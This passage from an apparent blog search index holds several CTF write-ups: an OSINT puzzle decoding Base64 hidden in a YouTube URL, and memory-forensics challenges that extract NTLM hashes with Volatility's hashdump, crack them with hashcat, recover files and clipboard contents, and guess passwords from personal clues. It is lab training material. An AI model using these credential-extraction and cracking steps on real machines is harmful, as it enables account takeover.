challenge is to use your OSINT (Open-Source Intelligence) and cryptography skills to uncover hidden information within a provided YouTube link. At first glance, this challenge may seem confusing, but with careful examination of the link and some cryptography, you can successfully extract the flag.\nSolution To successfully complete \u0026ldquo;The Quantum Nexus Prototype\u0026rdquo; challenge, follow these steps:\nOpening the YouTube Link:\nClick the provided YouTube link. However, keep in mind that vulnerabilities cannot be hidden within a real rickroll video. URL Examination:\nAs the video starts to load, take a close look at the link in the URL bar of your web browser. You will notice that the link is shrinking as the video loads. Character Extraction:\nThe link shrinking indicates that some characters within the URL are not part of the actual YouTube link and are omitted. Carefully extract these omitted parts. Base64 Decoding:\nThe extracted part, which has been omitted from the YouTube link, appears to be encoded using Base64. Decode this part to reveal the hidden flag. By closely examining the link and decoding the extracted information, you will successfully unveil the flag.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\n\u0026ldquo;The Quantum Nexus Prototype\u0026rdquo; challenge combines OSINT and cryptography skills to uncover the hidden flag within the provided YouTube link. It\u0026rsquo;s a test of your ability to identify unusual elements in URLs and apply cryptographic techniques to decode hidden information. Good luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/the-quantum-nexus-prototype/","title":"The Quantum Nexus Prototype"},{"content":"Unearth the Enigmatic Codebreaker\u0026rsquo;s Challenge - CTF Challenge Writeup Challenge: Unearth the Enigmatic Codebreaker\u0026rsquo;s Challenge\nPoints: 150\nCategory: Memory Forensics\nObjective The objective of the \u0026ldquo;Unearth the Enigmatic Codebreaker\u0026rsquo;s Challenge\u0026rdquo; is to leverage memory forensics skills to crack Jerry\u0026rsquo;s hashed NTLM password. Your task is to find the hashdump, extract Jerry\u0026rsquo;s hashed password, and use a tool like hashcat to crack it and reveal the hidden flag.\nSolution To successfully complete the \u0026ldquo;Unearth the Enigmatic Codebreaker\u0026rsquo;s Challenge,\u0026rdquo; follow these steps:\nPrerequisite - Complete m3m0irs:\nThis challenge is the third installment in the memory forensics series. While it is recommended to complete the previous challenges as a prerequisite, it\u0026rsquo;s not necessary to have completed it to proceed, especially since the CTF has ended. Jerry\u0026rsquo;s Password Hash:\nJerry\u0026rsquo;s password is hashed, and you need to crack it. Hashcat, which didn\u0026rsquo;t work for Dexter\u0026rsquo;s password in the previous challenge, is effective for Jerry\u0026rsquo;s. Locating the Hashdump:\nTo find the hashes to be cracked, you first need to locate the hashdump within the memory dump. You can achieve this using the following command: volatility -f \u0026lt;memory file\u0026gt; --profile=\u0026lt;architecture\u0026gt; hashdump. Cracking Jerry\u0026rsquo;s Hashed Password:\nAfter extracting Jerry\u0026rsquo;s hashed NTLM password from the hashdump, use a tool like \u0026ldquo;hashcat\u0026rdquo; to crack it. The objective is to reveal the plaintext of Jerry\u0026rsquo;s password. Flag Discovery:\nOnce you have successfully cracked Jerry\u0026rsquo;s hashed password, you will discover the flag. It will adhere to the specified format: petgrad2023{XXXXXXXXXX}. By following these steps and employing memory forensics techniques, you will uncover Jerry\u0026rsquo;s password and unveil the hidden flag in the \u0026ldquo;Unearth the Enigmatic Codebreaker\u0026rsquo;s Challenge.\u0026rdquo;\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn this memory forensics challenge, you must use your skills to crack Jerry\u0026rsquo;s hashed NTLM password and reveal the hidden flag. Best of luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/unearth-the-enigmatic-codebreakers-challenge/","title":"Unearth the Enigmatic Codebreaker's Challenge"},{"content":"Unearth the Long Lost Cipher - CTF Challenge Writeup Challenge: Unearth the Long Lost Cipher\nPoints: 150\nCategory: Memory Forensics\nObjective The objective of the \u0026ldquo;Unearth the Long Lost Cipher\u0026rdquo; challenge is to conduct memory forensics to find Dexter\u0026rsquo;s password on a computer. Your task is to identify the password and reveal the hidden flag.\nSolution To successfully complete the \u0026ldquo;Unearth the Long Lost Cipher\u0026rdquo; challenge, follow these steps:\nPrerequisite - Complete m3m0irs:\nThis challenge is the second in the memory forensics series and assumes you have completed the \u0026ldquo;m3m0irs\u0026rdquo; challenge. However, since the previous challenge has ended, it\u0026rsquo;s not necessary to have completed it to proceed. Password Search:\nYou are tasked with finding Dexter\u0026rsquo;s password on the computer. Passwords can be located in various ways during memory forensics, such as examining hash dumps or LSA dumps. Hash Cracking Attempt:\nAn initial approach might involve attempting to crack the password hashes, but it didn\u0026rsquo;t yield results in this case. File Scan and Grep:\nAnother approach is to scan the memory for files and grep for references to \u0026ldquo;Dexter.\u0026rdquo; You can perform file scans using the command: volatility -f \u0026lt;memory file\u0026gt; --profile=\u0026lt;architecture\u0026gt; filescan \u0026gt; filescan.txt. Locate SECRET.txt File:\nDuring the file scan, you may discover a file named \u0026ldquo;SECRET.txt.\u0026rdquo; Extract this file from the memory dump using the command: volatility -f \u0026lt;memory file\u0026gt; --profile=\u0026lt;architecture\u0026gt; dumpfiles -Q \u0026lt;memory-location\u0026gt; -D \u0026lt;directory-where-you-wish-to-place-the-file\u0026gt;. Examine Dexter\u0026rsquo;s Files:\nInvestigate the contents of Dexter\u0026rsquo;s files to gather information. You may find hints that lead to the password. Password Clues:\nDexter constructed his password using his favorite animal and a mysterious \u0026ldquo;MMYY.\u0026rdquo; Your task is to determine the animal and decode the password using the provided clues. Flag Format:\nThe flag will be in the format specified, with the animal represented by 7 letters, followed by \u0026ldquo;MM\u0026rdquo; and \u0026ldquo;YY.\u0026rdquo; Multiple Panther Instances:\nAfter examining Dexter\u0026rsquo;s files, you may discover two instances of the word \u0026ldquo;panther.\u0026rdquo; Assume this is his favorite animal and forms the first part of the flag (7 letters). Password Changing Hint:\nSECRET.txt may contain information about password changes. This hints that passwords are updated regularly. Password Discovery:\nTo narrow down the possibilities, investigate when the \u0026ldquo;notepad\u0026rdquo; application was used. You may find only two dates in the memory dump, so try both as potential password combinations. After following these steps and conducting memory forensics analysis, you will successfully locate Dexter\u0026rsquo;s password and reveal the hidden flag.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn the \u0026ldquo;Unearth the Long Lost Cipher\u0026rdquo; challenge, memory forensics skills are crucial as you explore the computer\u0026rsquo;s memory to discover Dexter\u0026rsquo;s password and unveil the flag. Best of luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/unearth-the-long-lost-cipher/","title":"Unearth the Long Lost Cipher"},{"content":"Unlock the Time Traveller\u0026rsquo;s Dilemma - CTF Challenge Writeup Challenge: Unlock the Time Traveller\u0026rsquo;s Dilemma\nPoints: 200\nCategory: Memory Forensics\nObjective The objective of the \u0026ldquo;Unlock the Time Traveller\u0026rsquo;s Dilemma\u0026rdquo; challenge was to perform advanced memory forensics to find the hidden flag. This challenge was the fourth in the memory forensics series, and while it was recommended to solve the previous three challenges, it wasn\u0026rsquo;t necessary as the CTF had ended.\nSolution To successfully complete the \u0026ldquo;Unlock the Time Traveller\u0026rsquo;s Dilemma\u0026rdquo; challenge, I followed these steps:\nFile Analysis:\nI explored various aspects of the computer\u0026rsquo;s memory, including examining the MFT (Master File Table) using mftparser and reviewing the state of the computer using screenshot. Unfortunately, none of these methods provided the flag. Clipboard Examination:\nWith my previous methods proving unsuccessful, I turned my attention to clipboard content. I used the command: volatility -f \u0026lt;memory file\u0026gt; --profile=\u0026lt;architecture\u0026gt; clipboard to examine the clipboard contents. Flag Discovery:\nAlthough the clipboard content didn\u0026rsquo;t immediately resemble the flag, but I tried it anyways and solved the challenge. After conducting a comprehensive memory forensics analysis, I successfully found the flag and completed the challenge.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn the \u0026ldquo;Unlock the Time Traveller\u0026rsquo;s Dilemma\u0026rdquo; challenge, my advanced memory forensics skills were put to the test as I explored various aspects of the computer\u0026rsquo;s memory to unveil the hidden flag. It was a rewarding challenge that required careful analysis. Good luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/unlock-the-time-travellers-dilemma/","title":"Unlock the Time Traveller's Dilemma"},{"content":"Witness the Quantum Entanglement - CTF Challenge Writeup Challenge: Witness the Quantum Entanglement\nPoints: 100\nCategory: Memory Forensics\nObjective The objective of the \u0026ldquo;Witness the Quantum Entanglement\u0026rdquo; challenge is to utilize your memory forensics skills to determine an essential piece of information. Building upon the previous challenges in the series, you are given a hint regarding Dexter\u0026rsquo;s wife, allowing you to focus on finding her birthdate. With this knowledge, you can proceed to solve the challenge.\nSolution To successfully complete the \u0026ldquo;Witness the Quantum Entanglement\u0026rdquo; challenge, follow these steps:\nPrevious Challenge Hint:\nIn the previous challenge, a hint was provided about Dexter\u0026rsquo;s wife. This hint, along with the knowledge that she is celebrating her 42nd birthday, forms the foundation for this challenge. Dexter\u0026rsquo;s Wife\u0026rsquo;s Birthdate:\nDexter\u0026rsquo;s wife\u0026rsquo;s age is established as 42. Now, the objective is to determine when she was born. Key Years:\nThe previous challenges also provided two years: 2023 and 2018. With these years in mind, attempt to calculate Dexter\u0026rsquo;s wife\u0026rsquo;s birthdate using both possibilities. Flag Discovery:\nTest both years to find the correct combination of information that results in her birthdate. One of these combinations will lead you to the correct birthdate, allowing you to obtain the flag. By carefully analyzing the provided hints and experimenting with the available information, you will successfully determine Dexter\u0026rsquo;s wife\u0026rsquo;s birthdate and retrieve the flag.\nFlag The flag for this challenge is in the format: petgrad2023{XXXXXXXXXX}.\nIn the \u0026ldquo;Witness the Quantum Entanglement\u0026rdquo; challenge, your memory forensics skills and problem-solving abilities are put to the test as you work to unravel the mystery of Dexter\u0026rsquo;s wife\u0026rsquo;s birthdate. Good luck!\n","date":"2023-10-10T00:00:00Z","permalink":"https://qiaonpc.github.io/post/witness-the-quantum-entanglement/","title":"Witness the Quantum Entanglement"}]